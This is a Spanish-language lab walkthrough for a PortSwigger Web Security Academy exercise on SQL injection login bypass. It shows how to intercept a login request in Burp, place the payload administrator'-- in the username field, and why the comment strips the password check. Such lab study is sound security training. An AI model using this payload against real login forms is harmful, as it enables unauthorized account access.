# Lab — SQL injection vulnerability allowing login bypass

> Fuente principal: solución oficial de PortSwigger Web Security Academy.

## Objetivo exacto

Iniciar sesión como:

```text
administrator
```

sin conocer su contraseña.

---

# Qué enseña este lab

La aplicación usa `username` y `password` dentro de una consulta SQL de autenticación.

Conceptualmente podría ser algo parecido a:

```sql
SELECT * FROM users
WHERE username = 'wiener'
AND password = 'peter';
```

Si `username` se concatena de forma insegura, podemos modificar la estructura de la consulta.

---

# Procedimiento oficial paso a paso

## Paso 1 — Abrir Login

Ir a:

```text
My account
```

y abrir el formulario de login.

---

## Paso 2 — Activar Intercept

En Burp:

```text
Proxy
→ Intercept
→ Intercept is ON
```

---

## Paso 3 — Enviar un login cualquiera

Introducir cualquier username/password y enviar el formulario para capturar:

```http
POST /login HTTP/2
```

En el body veremos algo parecido a:

```text
username=test&password=test
```

---

## Paso 4 — Modificar solamente `username`

Cambiar su valor por el payload oficial:

```text
administrator'--
```

Por ejemplo:

```text
username=administrator'--&password=test
```

No necesitamos conocer la contraseña real del administrador.

---

## Paso 5 — Forward

Pulsar:

```text
Forward
```

La aplicación debería autenticarnos como:

```text
administrator
```

El lab quedará resuelto.

---

# Qué ocurre dentro de SQL

Consulta original conceptual:

```sql
SELECT * FROM users
WHERE username = 'administrator'
AND password = 'password';
```

Con:

```text
administrator'--
```

puede transformarse conceptualmente en:

```sql
SELECT * FROM users
WHERE username = 'administrator'--'
AND password = 'test';
```

El `--` convierte el resto en comentario.

Por eso la parte:

```sql
AND password = 'test'
```

deja de formar parte efectiva de la consulta.

La aplicación encuentra la fila de `administrator` y considera el login válido.

---

# Lo importante: no estamos adivinando el password

Este ataque NO hace:

```text
probar contraseñas hasta acertar
```

Hace:

```text
modificar la lógica SQL
        ↓
la comprobación de password deja de aplicarse
```

Eso diferencia este lab del brute force visto en Authentication.

---

# Burp que tengo que aprender

- `Proxy → Intercept`;
- localizar `POST /login`;
- identificar parámetros del body;
- modificar únicamente `username`;
- mantener `password` con cualquier valor;
- usar `Forward`;
- observar el cambio de estado de autenticación.

---

# Práctica complementaria con Repeater

> Opcional. No sustituye el workflow oficial.

Después de resolver el lab se puede enviar `POST /login` a Repeater para comparar:

```text
username=administrator&password=incorrecta
```

con:

```text
username=administrator'--&password=incorrecta
```

La comparación ayuda a entender que el cambio está en la lógica SQL, no en la contraseña.

---

# Errores frecuentes

## Poner el payload en `password`

La solución oficial modifica:

```text
username
```

## Quitar `administrator`

Necesitamos que la consulta seleccione específicamente la cuenta:

```text
administrator
```

## Confundir este lab con Access Control

Aquí no cambiamos una cookie de rol ni un `id`.

Estamos alterando la **consulta de autenticación de la base de datos**.

---

# Checklist

- [ ] Abrí Login.
- [ ] Activé Intercept.
- [ ] Capturé `POST /login`.
- [ ] Identifiqué `username` y `password`.
- [ ] Cambié `username` a `administrator'--`.
- [ ] Hice Forward.
- [ ] Entré como administrator.
- [ ] Entiendo por qué ya no se comprueba el password.

---

# Regla para recordar

```text
administrator'--

administrator → selecciona la cuenta
'             → cierra la cadena SQL
--            → comenta la comprobación de password
```
